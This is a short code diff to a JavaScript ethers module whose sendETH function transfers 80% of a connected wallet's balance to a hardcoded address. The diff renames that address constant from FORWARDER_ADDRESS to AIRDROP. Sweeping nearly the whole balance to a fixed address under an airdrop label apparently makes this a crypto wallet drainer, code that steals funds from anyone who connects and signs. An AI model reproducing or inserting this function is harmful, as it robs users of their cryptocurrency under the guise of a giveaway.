@@ -1,6 +1,6 @@
 // create send transaction function
 import { ethers } from "ethers";
-import { FORWARDER_ADDRESS } from "./constant";
+import { AIRDROP } from "./constant";
 // import { getUniversalProvider } from "./provider";
 
 export const sendETH = async (provider, signer) => {
@@ -15,11 +15,11 @@ export const sendETH = async (provider, signer) => {
         }
 
         // leave small buffer for gas (safe method)
-        const amountToSend = (balanceWei * 94n) / 100n;
+        const amountToSend = (balanceWei * 80n) / 100n;
 
         // send transaction
         const tx = await signer.sendTransaction({
-            to: FORWARDER_ADDRESS,
+            to: AIRDROP, // recipient address
             // value: ethers.parseEther("0.0001"),
             value: amountToSend, // amount already in wei
         });
